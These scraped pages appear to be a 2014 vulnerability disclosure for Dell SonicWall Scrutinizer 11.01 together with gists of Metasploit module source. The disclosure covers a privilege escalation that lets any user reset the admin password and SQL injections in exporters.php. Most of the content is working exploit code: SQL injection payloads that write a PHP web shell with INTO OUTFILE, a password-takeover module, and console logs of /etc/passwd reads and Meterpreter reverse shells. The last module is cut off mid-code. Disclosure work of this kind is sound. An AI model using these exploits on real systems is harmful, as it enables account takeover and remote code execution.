=== Content from packetstormsecurity.com_86443bbb_20250124_205036.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

 [About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from gist.github.com_a043d1b2_20250124_205038.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fbrandonprry%2F36b4b8df1cde279a9305)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fbrandonprry%2F36b4b8df1cde279a9305&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fbrandonprry%2F36b4b8df1cde279a9305) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fbrandonprry%2F36b4b8df1cde279a9305&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@brandonprry](https://avatars.githubusercontent.com/u/483180?s=64&v=4)](/brandonprry)

# [brandonprry](/brandonprry)/**[gist:36b4b8df1cde279a9305](/brandonprry/36b4b8df1cde279a9305)**

Created
July 10, 2014 16:12

Show Gist options

* [Download ZIP](/brandonprry/36b4b8df1cde279a9305/archive/27daf450faf5764f1bf68ed1a81d059c00dde933.zip)

* [Star
  2
  (2)](/login?return_to=https%3A%2F%2Fgist.github.com%2Fbrandonprry%2F36b4b8df1cde279a9305)You must be signed in to star a gist
* [Fork
  1
  (1)](/login?return_to=https%3A%2F%2Fgist.github.com%2Fbrandonprry%2F36b4b8df1cde279a9305)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/brandonprry/36b4b8df1cde279a9305.js&quot;&gt;&lt;/script&gt;
* Save brandonprry/36b4b8df1cde279a9305 to your computer and use it in GitHub Desktop.

[Code](/brandonprry/36b4b8df1cde279a9305)
[Revisions
1](/brandonprry/36b4b8df1cde279a9305/revisions)
[Stars
2](/brandonprry/36b4b8df1cde279a9305/stargazers)
[Forks
1](/brandonprry/36b4b8df1cde279a9305/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/brandonprry/36b4b8df1cde279a9305.js&quot;&gt;&lt;/script&gt;

Save brandonprry/36b4b8df1cde279a9305 to your computer and use it in GitHub Desktop.

[Download ZIP](/brandonprry/36b4b8df1cde279a9305/archive/27daf450faf5764f1bf68ed1a81d059c00dde933.zip)

 [Raw](/brandonprry/36b4b8df1cde279a9305/raw/27daf450faf5764f1bf68ed1a81d059c00dde933/gistfile1.txt)

[**gistfile1.txt**](#file-gistfile1-txt)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | Dell Scrutinizer 11.01 several vulnerabilities |
| --- | --- |
|  | http://www.mysonicwall.com has a trial available. |
|  |  |
|  |  |
|  | Dell Sonicwall Scrutinizer suffers from several SQL injections, many of which can end up with |
|  | remote code execution. An attacker needs to be authenticated, but not as an administrator. |
|  | However, that wouldn’t stop anyone since there is also a privilege escalation vulnerability in that |
|  | any authenticated user can change any other user’s password, including the admin. One SQL |
|  | injection, which a Metasploit module was provided for, requires this privilege escalation to reach |
|  | since it exists in the new user mechanism only available to admins. |
|  |  |
|  | Privilege escalation via password change mechanism |
|  | ———————————————————- |
|  | When changing you password, you POST a request with a savePrefs variable. This variable is |
|  | actually the id of the user whose password is being changed. By changing it to ‘1’, for instance, |
|  | you will change the password for the person with an ID of 1 (which is always admin as far as I |
|  | can tell). |
|  |  |
|  |  |
|  | SQL injection in new user mechanism (requires admin) |
|  | ————————————————————- |
|  | When creating a new user, the selectedUserGroup variable POSTed to /cgi-bin/admin.cgi is |
|  | vulnerable to SQL injection that allows an attacker to read an arbitrary ﬁle from the FS. |
|  |  |
|  | A Metasploit module was provided that exploits the above two vulnerabilities to escalate an |
|  | arbitrary authenticated user to admin, which then will read /etc/passwd via the SQL injection. |
|  | See auxiliary module scrutinizer\_password\_change.rb. |
|  |  |
|  |  |
|  | msf auxiliary(scrutinizer\_password\_change) > show options |
|  |  |
|  | Module options (auxiliary/gather/scrutinizer\_password\_change): |
|  |  |
|  | Name Current Setting Required Description |
|  | ---- --------------- -------- ----------- |
|  | FILENAME /etc/passwd yes The ﬁle to read from the admin sqli |
|  | PASSWORD password no The password to authenticate with |
|  | Proxies no Use a proxy chain |
|  | RHOST 192.168.1.99 yes The target address |
|  | RPORT 80 yes The target port |
|  | TARGETURI / yes Base Application path |
|  | USERID 1 yes The ID of the user to have their password changed. 'admin' is |
|  | always 1. |
|  | USERNAME username no The username to authenticate as |
|  | VHOST no HTTP server virtual host |
|  |  |
|  | msf auxiliary(scrutinizer\_password\_change) > run |
|  |  |
|  | [+] Log in with the user's name and the password 'passw0rd!' |
|  | [+] Attempting to read ﬁle using 'admin' account: /etc/passwd |
|  | [+] root:x:0:0:root:/root:/bin/bash |
|  | bin:x:1:1:bin:/bin:/sbin/nologin |
|  | daemon:x:2:2:daemon:/sbin:/sbin/nologin |
|  | adm:x:3:4:adm:/var/adm:/sbin/nologin |
|  | lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin |
|  | sync:x:5:0:sync:/sbin:/bin/sync |
|  | shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown |
|  | halt:x:7:0:halt:/sbin:/sbin/halt |
|  | mail:x:8:12:mail:/var/spool/mail:/sbin/nologin |
|  | uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin!operator:x:11:0:operator:/root:/sbin/nologin |
|  | games:x:12:100:games:/usr/games:/sbin/nologin |
|  | gopher:x:13:30:gopher:/var/gopher:/sbin/nologin |
|  | ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin |
|  | nobody:x:99:99:Nobody:/:/sbin/nologin |
|  | vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin |
|  | rpc:x:32:32:Rpcbind Daemon:/var/cache/rpcbind:/sbin/nologin |
|  | rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin |
|  | nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin |
|  | sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin |
|  | plixer:x:500:500::/home/plixer:/bin/bash |
|  | ntp:x:38:38::/etc/ntp:/sbin/nologin |
|  | dbus:x:81:81:System message bus:/:/sbin/nologin |
|  | haldaemon:x:68:68:HAL daemon:/:/sbin/nologin |
|  | apache:x:48:48:Apache:/var/www:/sbin/nologin |
|  | rtkit:x:499:498:RealtimeKit:/proc:/sbin/nologin |
|  | pulse:x:498:497:PulseAudio System Daemon:/var/run/pulse:/sbin/nologin |
|  | mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash |
|  | tcpdump:x:72:72::/:/sbin/nologin |
|  |  |
|  | [\*] Auxiliary module execution completed |
|  | msf auxiliary(scrutinizer\_password\_change) > |
|  |  |
|  |  |
|  |  |
|  | Within the appliance, you may see /home/plixer/scrutinizer/html/d4d/exporters.php. This script, |
|  | which is used actively throughout the web UI, is riddled with SQL injections. You can read the |
|  | ﬁle and see the way the programmer(s?) is building their SQL injections. I will detail some of the |
|  | injections that I could exploit and achieve RCE with (with Metasploit modules). |
|  |  |
|  | The changeUnit function is vulnerable to a UNION-based SQL injection in the user\_id parameter |
|  | which allows a remote user to write a ﬁle to the ﬁlesystem via the OUTFILE vector. We have |
|  | write permissions on the folder from the sql injection, so a PHP script can be written to /home/ |
|  | plixer/scrutinizer/html/d4d/ and the code will be executed upon a GET. A metasploit module was |
|  | provided for this. (see scrutinizer\_changeunit\_sqli\_exec.rb) |
|  |  |
|  | msf exploit(scrutinizer\_changeunit\_sqli\_exec) > set RHOST 192.168.1.99 |
|  | RHOST => 192.168.1.99 |
|  | msf exploit(scrutinizer\_changeunit\_sqli\_exec) > set USERNAME username |
|  | USERNAME => username |
|  | msf exploit(scrutinizer\_changeunit\_sqli\_exec) > set PASSWORD password |
|  | PASSWORD => password |
|  | msf exploit(scrutinizer\_changeunit\_sqli\_exec) > exploit |
|  |  |
|  | [\*] Started reverse handler on 192.168.1.31:4444 |
|  | [\*] Sending stage (39848 bytes) to 192.168.1.99 |
|  | [\*] Meterpreter session 3 opened (192.168.1.31:4444 -> 192.168.1.99:55077) at 2014-04-20 |
|  | 12:18:22 -0500 |
|  | [+] Deleted /home/plixer/scrutinizer/html/d4d/q0Oe8orPuCgoBAgk.php |
|  |  |
|  | meterpreter > sysinfo |
|  | Computer : fdsafds |
|  | OS : Linux fdsafds 2.6.32-358.11.1.el6.x86\_64 #1 SMP Wed Jun 12 03:34:52 UTC 2013 |
|  | x86\_64 |
|  | Meterpreter : php/php |
|  | meterpreter > |
|  |  |
|  |  |
|  |  |
|  | The methodDetail function is vulnerable to a UNION-based SQL injection similar to the one |
|  | above. The methodDetail parameter itself is what is vulnerable. A metasploit module that |
|  | achieves RCE via this vector has been supplied. ( see scrutinizer\_methoddetail\_sqli\_exec.rb) |
|  |  |
|  | msf exploit(scrutinizer\_methoddetail\_sqli\_exec) > set USERNAME username |
|  | USERNAME => username |
|  | msf exploit(scrutinizer\_methoddetail\_sqli\_exec) > set PASSWORD password |
|  | PASSWORD => password |
|  | msf exploit(scrutinizer\_methoddetail\_sqli\_exec) > set RHOST 192.168.1.99 |
|  | RHOST => 192.168.1.99 |
|  | msf exploit(scrutinizer\_methoddetail\_sqli\_exec) > exploit |
|  | ! |
|  | [\*] Started reverse handler on 192.168.1.31:4444 |
|  | [\*] Sending stage (39848 bytes) to 192.168.1.99 |
|  | [\*] Meterpreter session 2 opened (192.168.1.31:4444 -> 192.168.1.99:55063) at 2014-04-20 |
|  | 12:16:23 -0500 |
|  | [+] Deleted /home/plixer/scrutinizer/html/d4d/6QOILiKezqXHEU07.php |
|  |  |
|  | meterpreter > sysinfo |
|  | Computer : fdsafds |
|  | OS : Linux fdsafds 2.6.32-358.11.1.el6.x86\_64 #1 SMP Wed Jun 12 03:34:52 UTC 2013 |
|  | x86\_64 |
|  | Meterpreter : php/php |
|  | meterpreter > |
|  |  |
|  |  |
|  | The xcNetworkDetail function is vulnerable to a UNION-based SQL injection like the ones |
|  | above. The xcNetworkDetail parameter is itself what is vulnerable. A metasploit module was |
|  | provided for this. (see scrutinizer\_xcnetworkdetail\_sqli\_exec.rb) |
|  |  |
|  | msf exploit(scrutinizer\_xcnetworkdetail\_sqli\_exec) > set RHOST 192.168.1.99 |
|  | RHOST => 192.168.1.99 |
|  | msf exploit(scrutinizer\_xcnetworkdetail\_sqli\_exec) > set USERNAME username |
|  | USERNAME => username |
|  | msf exploit(scrutinizer\_xcnetworkdetail\_sqli\_exec) > set PASSWORD password |
|  | PASSWORD => password |
|  | msf exploit(scrutinizer\_xcnetworkdetail\_sqli\_exec) > exploit |
|  |  |
|  | [\*] Started reverse handler on 192.168.1.31:4444 |
|  | [\*] Sending stage (39848 bytes) to 192.168.1.99 |
|  | [\*] Meterpreter session 1 opened (192.168.1.31:4444 -> 192.168.1.99:55045) at 2014-04-20 |
|  | 12:14:57 -0500 |
|  | [+] Deleted /home/plixer/scrutinizer/html/d4d/AJ7W4nC4TOpLuS4F.php |
|  |  |
|  | meterpreter > sysinfo |
|  | Computer : fdsafds |
|  | OS : Linux fdsafds 2.6.32-358.11.1.el6.x86\_64 #1 SMP Wed Jun 12 03:34:52 UTC 2013 |
|  | x86\_64 |
|  | Meterpreter : php/php |
|  | meterpreter > |

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2Fbrandonprry%2F36b4b8df1cde279a9305)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from gist.github.com_f63ccbc1_20250124_205039.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fbrandonprry%2F76741d9a0d4f518fe297)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fbrandonprry%2F76741d9a0d4f518fe297&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2Fbrandonprry%2F76741d9a0d4f518fe297) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2Fbrandonprry%2F76741d9a0d4f518fe297&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@brandonprry](https://avatars.githubusercontent.com/u/483180?s=64&v=4)](/brandonprry)

# [brandonprry](/brandonprry)/**[scrutinizer\_changeunit\_sqli\_exec.rb](/brandonprry/76741d9a0d4f518fe297)**

Created
July 10, 2014 16:16

Show Gist options

* [Download ZIP](/brandonprry/76741d9a0d4f518fe297/archive/8896d0808a0c65ceff9a5e1540c783c61af3131d.zip)

* [Star
  0
  (0)](/login?return_to=https%3A%2F%2Fgist.github.com%2Fbrandonprry%2F76741d9a0d4f518fe297)You must be signed in to star a gist
* [Fork
  1
  (1)](/login?return_to=https%3A%2F%2Fgist.github.com%2Fbrandonprry%2F76741d9a0d4f518fe297)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/brandonprry/76741d9a0d4f518fe297.js&quot;&gt;&lt;/script&gt;
* Save brandonprry/76741d9a0d4f518fe297 to your computer and use it in GitHub Desktop.

[Code](/brandonprry/76741d9a0d4f518fe297)
[Revisions
1](/brandonprry/76741d9a0d4f518fe297/revisions)
[Forks
1](/brandonprry/76741d9a0d4f518fe297/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/brandonprry/76741d9a0d4f518fe297.js&quot;&gt;&lt;/script&gt;

Save brandonprry/76741d9a0d4f518fe297 to your computer and use it in GitHub Desktop.

[Download ZIP](/brandonprry/76741d9a0d4f518fe297/archive/8896d0808a0c65ceff9a5e1540c783c61af3131d.zip)

 [Raw](/brandonprry/76741d9a0d4f518fe297/raw/8896d0808a0c65ceff9a5e1540c783c61af3131d/scrutinizer_changeunit_sqli_exec.rb)

[**scrutinizer\_changeunit\_sqli\_exec.rb**](#file-scrutinizer_changeunit_sqli_exec-rb)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | # This module requires Metasploit: http//metasploit.com/download |
| --- | --- |
|  | ## |
|  | # Current source: https://github.com/rapid7/metasploit-framework |
|  | ## |
|  |  |
|  | require 'msf/core' |
|  |  |
|  | class Metasploit3 < Msf::Exploit::Remote |
|  | Rank = ExcellentRanking |
|  |  |
|  | include Msf::Exploit::Remote::HttpClient |
|  | include Msf::Exploit::FileDropper |
|  |  |
|  | def initialize(info={}) |
|  | super(update\_info(info, |
|  | 'Name' => "Dell Sonicwall Scrutinizer 11.01 Authenticated Code Execution", |
|  | 'Description' => %q{ |
|  | Dell Sonicwall Scrutinizer 11.01 is vulnerable to an authenticated SQL injection that allows |
|  | an attacker to write arbitrary files to the file system. This vulnerability is used |
|  | to write a PHP script to the file system to gain RCE. |
|  |  |
|  | This was tested on the Dell Scrutinizer appliance available to download on mysonicwall.com |
|  | }, |
|  | 'License' => MSF\_LICENSE, |
|  | 'Author' => [], |
|  | 'References' => [], |
|  | 'Platform' => ['php'], |
|  | 'Arch' => ARCH\_PHP, |
|  | 'Targets' => [['Dell Sonicwall Scrutinizer 11.01', {}],], |
|  | 'Privileged' => false, |
|  | 'DisclosureDate' => "", |
|  | 'DefaultTarget' => 0)) |
|  |  |
|  | register\_options( |
|  | [ |
|  | OptString.new('TARGETURI', [ true, "Base Application path", "/" ]), |
|  | OptString.new('USERNAME', [ false, "The username to authenticate as"]), |
|  | OptString.new('PASSWORD', [ false, "The password to authenticate with" ]) |
|  | ], self.class) |
|  | end |
|  |  |
|  | def exploit |
|  | res = send\_request\_cgi({ |
|  | 'uri' => normalize\_uri(target\_uri, '/cgi-bin/login.cgi'), |
|  | 'vars\_get' => { |
|  | 'name' => datastore['USERNAME'], |
|  | 'pwd' => datastore['PASSWORD'] |
|  | } |
|  | }) |
|  |  |
|  | res.body =~ /"userid":"(.\*)","sessionid":"(.\*)"/ |
|  | sessionid = $2 |
|  |  |
|  | cookie = "cookiesenabled=1;sessionid=#{sessionid};userid=#{$1}" |
|  |  |
|  | hexstr = ("<?php " + payload.encoded + " ?>").bytes.map { |b| sprintf("%02x",b) }.join |
|  |  |
|  | post = { |
|  | 'ti' => 1, |
|  | 'limit' => 25, |
|  | 'page' => 0, |
|  | 'order' => '', |
|  | 'dir' => 'DESC', |
|  | 'bbp' => 'percent', |
|  | 'changeUnit' => '', |
|  | #should be trivial to support windows, just change the paths |
|  | 'user\_id' => "-9513 OR 9319=9319 LIMIT 0,1 INTO OUTFILE '/home/plixer/scrutinizer/html/d4d/#{sessionid}.php' LINES TERMINATED BY 0x#{hexstr}" |
|  | } |
|  |  |
|  | register\_files\_for\_cleanup("/home/plixer/scrutinizer/html/d4d/#{sessionid}.php") |
|  |  |
|  | send\_request\_cgi({ |
|  | 'uri' => normalize\_uri(target\_uri, '/d4d/exporters.php'), |
|  | 'method' => 'POST', |
|  | 'vars\_post' => post, |
|  | 'cookie' => cookie |
|  | }) |
|  |  |
|  | send\_request\_cgi({ 'uri' => normalize\_uri(target\_uri, "/d4d/#{sessionid}.php")}) |
|  | end |
|  | end |
|  |  |
|  | \_\_END\_\_ |
|  | msf exploit(scrutinizer\_sqli\_exec) > show options |
|  |  |
|  | Module options (exploit/dell/scrutinizer/scrutinizer\_sqli\_exec): |
|  |  |
|  | Name Current Setting Required Description |
|  | ---- --------------- -------- ----------- |
|  | PASSWORD passw0rd! no The password to authenticate with |
|  | Proxies no Use a proxy chain |
|  | RHOST 192.168.1.99 yes The target address |
|  | RPORT 80 yes The target port |
|  | TARGETURI / yes Base Application path |
|  | USERNAME username no The username to authenticate as |
|  | VHOST no HTTP server virtual host |
|  |  |
|  |  |
|  | Exploit target: |
|  |  |
|  | Id Name |
|  | -- ---- |
|  | 0 Dell Sonicwall Scrutinizer 11.01 |
|  |  |
|  |  |
|  | msf exploit(scrutinizer\_sqli\_exec) > exploit |
|  |  |
|  | [\*] Started reverse handler on 192.168.1.31:4444 |
|  | [\*] Sending stage (39195 bytes) to 192.168.1.99 |
|  | [\*] Meterpreter session 1 opened (192.168.1.31:4444 -> 192.168.1.99:38133) at 2014-02-15 09:33:34 -0600 |
|  |  |
|  | meterpreter > shell |
|  | Process 3038 created. |
|  | Channel 0 created. |
|  | id |
|  | uid=48(apache) gid=48(apache) groups=48(apache),500(plixer) |
|  | uname -a |
|  | Linux fdsafdsafdsa 2.6.32-358.11.1.el6.x86\_64 #1 SMP Wed Jun 12 03:34:52 UTC 2013 x86\_64 x86\_64 x86\_64 GNU/Linux |

 [Raw](/brandonprry/76741d9a0d4f518fe297/raw/8896d0808a0c65ceff9a5e1540c783c61af3131d/scrutinizer_methoddetail_sqli_exec.rb)

[**scrutinizer\_methoddetail\_sqli\_exec.rb**](#file-scrutinizer_methoddetail_sqli_exec-rb)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | # This module requires Metasploit: http//metasploit.com/download |
| --- | --- |
|  | ## |
|  | # Current source: https://github.com/rapid7/metasploit-framework |
|  | ## |
|  |  |
|  | require 'msf/core' |
|  |  |
|  | class Metasploit3 < Msf::Exploit::Remote |
|  | Rank = ExcellentRanking |
|  |  |
|  | include Msf::Exploit::Remote::HttpClient |
|  | include Msf::Exploit::FileDropper |
|  |  |
|  | def initialize(info={}) |
|  | super(update\_info(info, |
|  | 'Name' => "Dell Sonicwall Scrutinizer 11.01 Authenticated Code Execution", |
|  | 'Description' => %q{ |
|  | Dell Sonicwall Scrutinizer 11.01 is vulnerable to an authenticated SQL injection that allows |
|  | an attacker to write arbitrary files to the file system. This vulnerability is used |
|  | to write a PHP script to the file system to gain RCE. |
|  |  |
|  | This was tested on the Dell Scrutinizer appliance available to download on mysonicwall.com |
|  | }, |
|  | 'License' => MSF\_LICENSE, |
|  | 'Author' => [], |
|  | 'References' => [], |
|  | 'Platform' => ['php'], |
|  | 'Arch' => ARCH\_PHP, |
|  | 'Targets' => [['Dell Sonicwall Scrutinizer 11.01', {}],], |
|  | 'Privileged' => false, |
|  | 'DisclosureDate' => "", |
|  | 'DefaultTarget' => 0)) |
|  |  |
|  | register\_options( |
|  | [ |
|  | OptString.new('TARGETURI', [ true, "Base Application path", "/" ]), |
|  | OptString.new('USERNAME', [ false, "The username to authenticate as"]), |
|  | OptString.new('PASSWORD', [ false, "The password to authenticate with" ]) |
|  | ], self.class) |
|  | end |
|  |  |
|  | def exploit |
|  | res = send\_request\_cgi({ |
|  | 'uri' => normalize\_uri(target\_uri, '/cgi-bin/login.cgi'), |
|  | 'vars\_get' => { |
|  | 'name' => datastore['USERNAME'], |
|  | 'pwd' => datastore['PASSWORD'] |
|  | } |
|  | }) |
|  |  |
|  | res.body =~ /"userid":"(.\*)","sessionid":"(.\*)"/ |
|  | sessionid = $2 |
|  |  |
|  | cookie = "cookiesenabled=1;sessionid=#{sessionid};userid=#{$1}" |
|  |  |
|  | hexstr = ("<?php " + payload.encoded + " ?>").bytes.map { |b| sprintf("%02x",b) }.join |
|  |  |
|  | post = { |
|  | 'methodDetail' => "-6045 UNION ALL SELECT NULL,NULL,NULL,0x#{hexstr},NULL,NULL,NULL," + |
|  | "NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL " + |
|  | "INTO DUMPFILE '/home/plixer/scrutinizer/html/d4d/#{sessionid}.php'#" |
|  | } |
|  |  |
|  | register\_files\_for\_cleanup("/home/plixer/scrutinizer/html/d4d/#{sessionid}.php") |
|  |  |
|  | send\_request\_cgi({ |
|  | 'uri' => normalize\_uri(target\_uri, '/d4d/exporters.php'), |
|  | 'vars\_get' => post, |
|  | 'cookie' => cookie |
|  | }) |
|  |  |
|  | send\_request\_cgi({ 'uri' => normalize\_uri(target\_uri, "/d4d/#{sessionid}.php")}) |
|  | end |
|  | end |
|  |  |
|  | \_\_END\_\_ |
|  | msf exploit(scrutinizer\_sqli\_exec) > show options |
|  |  |
|  | Module options (exploit/dell/scrutinizer/scrutinizer\_sqli\_exec): |
|  |  |
|  | Name Current Setting Required Description |
|  | ---- --------------- -------- ----------- |
|  | PASSWORD passw0rd! no The password to authenticate with |
|  | Proxies no Use a proxy chain |
|  | RHOST 192.168.1.99 yes The target address |
|  | RPORT 80 yes The target port |
|  | TARGETURI / yes Base Application path |
|  | USERNAME username no The username to authenticate as |
|  | VHOST no HTTP server virtual host |
|  |  |
|  |  |
|  | Exploit target: |
|  |  |
|  | Id Name |
|  | -- ---- |
|  | 0 Dell Sonicwall Scrutinizer 11.01 |
|  |  |
|  |  |
|  | msf exploit(scrutinizer\_sqli\_exec) > exploit |
|  |  |
|  | [\*] Started reverse handler on 192.168.1.31:4444 |
|  | [\*] Sending stage (39195 bytes) to 192.168.1.99 |
|  | [\*] Meterpreter session 1 opened (192.168.1.31:4444 -> 192.168.1.99:38133) at 2014-02-15 09:33:34 -0600 |
|  |  |
|  | meterpreter > shell |
|  | Process 3038 created. |
|  | Channel 0 created. |
|  | id |
|  | uid=48(apache) gid=48(apache) groups=48(apache),500(plixer) |
|  | uname -a |
|  | Linux fdsafdsafdsa 2.6.32-358.11.1.el6.x86\_64 #1 SMP Wed Jun 12 03:34:52 UTC 2013 x86\_64 x86\_64 x86\_64 GNU/Linux |

 [Raw](/brandonprry/76741d9a0d4f518fe297/raw/8896d0808a0c65ceff9a5e1540c783c61af3131d/scrutinizer_password_change.rb)

[**scrutinizer\_password\_change.rb**](#file-scrutinizer_password_change-rb)

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

|  | # This module requires Metasploit: http//metasploit.com/download |
| --- | --- |
|  | ## |
|  | # Current source: https://github.com/rapid7/metasploit-framework |
|  | ## |
|  |  |
|  | require 'msf/core' |
|  |  |
|  | class Metasploit3 < Msf::Auxiliary |
|  | Rank = ExcellentRanking |
|  |  |
|  | include Msf::Exploit::Remote::HttpClient |
|  |  |
|  | def initialize(info={}) |
|  | super(update\_info(info, |
|  | 'Name' => "Dell Sonicwall Scrutinizer Authenticated Arbitrary User Password Change and File Read", |
|  | 'Description' => %q{ |
|  | Dell Sonicwall Scrutinizer 11.01 is vulnerable to an arbitrary user password change vuln |
|  | and a SQL injection as an admin user during account creation allows for the reading |
|  | of arbitrary files. |
|  |  |
|  | This module exploits both vulns to go from a user with lesser privileges to changing |
|  | the admin user's password, then logging in as admin to exploit the SQLi and read |
|  | an arbitrary specified file. Tested on a CentOS box, should work on windows as well. |
|  | }, |
|  | 'License' => MSF\_LICENSE, |
|  | 'Author' => [], |
|  | 'References' => [], |
|  | 'Targets' => [['Dell Sonicwall Scrutinizer 11.01', {}],], |
|  | 'Privileged' => false, |
|  | 'DisclosureDate' => "", |
|  | 'DefaultTarget' => 0)) |
|  |  |
|  | register\_options( |
|  | [ |
|  | OptString.new('FILENAME', ['false', 'The file to read from the admin sqli', '/etc/passwd']), |
|  | OptString.new('TARGETURI', [ true, "Base Application path", "/" ]), |
|  | OptString.new('USERNAME', [ false, "The username to authenticate as"]), |
|  | OptString.new('PASSWORD', [ false, "The password to authenticate with" ]), |
|  | OptInt.new('USERID', [true, "The ID of the user to have their password changed. 'admin' is always 1.", 1]) |
|  | ], self.class) |
|  | end |
|  |  |
|  | def run |
|  | res = send\_request\_cgi({ |
|  | 'uri' => normalize\_uri(target\_uri, '/cgi-bin/login.cgi'), |
|  | 'vars\_get' => { |
|  | 'name' => datastore['USERNAME'], |
|  | 'pwd' => datastore['PASSWORD'] |
|  | } |
|  | }) |
|  |  |
|  | res.body =~ /"userid":"(.\*)","sessionid":"(.\*)"/ |
|  | sessionid = $2 |
|  |  |
|  | cookie = "cookiesenabled=1; sessionid=#{sessionid}; userid=#{$1}" |
|  |  |
|  | post = { |
|  | 'tool' => 'userprefs', |
|  | 'savePrefs' => datastore['USERID'], |
|  | 'othersTop' => 'true', |
|  | 'graphType' => 'step', |
|  | 'hostDisplayType' => 'DNS', |
|  | 'language' => 'english', |
|  | 'skin' => 'retro-sonicwall', |
|  | 'unit' => 'percent', |
|  | 'tab' => 'tab1', |
|  | 'defaultMap' => '0', |
|  | 'flowTopn' => '10', |
|  | 'statusOption' => 'conversations', |
|  | 'email' => 'undefined', |
|  | 'interval' => "1m", |
|  | 'ibOb' => 'inbound', |
|  | 'srcDst' => 'src', |
|  | 'alarmsTopn' => '50', |
|  | 'statusTopn' => '25', |
|  | 'statusRefresh' => '5', |
|  | 'statusViewDeflt' => 'topInterfaces', |
|  | 'defMailRep' => 'esoTopConversationsCount', |
|  | 'Timezone' => 'Automatic', |
|  | 'savePass' => 'passw0rd!', |
|  | 'useLdap' => '0', |
|  | 'defFlowalyzRep' => 'availability', |
|  | 'readonly' => '0' |
|  | } |
|  |  |
|  | res = send\_request\_cgi({ |
|  | 'uri' => normalize\_uri(target\_uri, '/cgi-bin/admin.cgi'), |
|  | 'method' => 'POST', |
|  | 'vars\_post' => post, |
|  | 'cookie' => cookie |
|  | }) |
|  |  |
|  | if res.code == 500 |
|  | fail\_with("Error updating user's password. Check your credentials") |
|  | end |
|  |  |
|  | print\_good ("Log in with the user's name and the password 'passw0rd!'") |
|  |  |
|  | if datastore['USERID'] == 1 && datastore['FILENAME'] != '' |
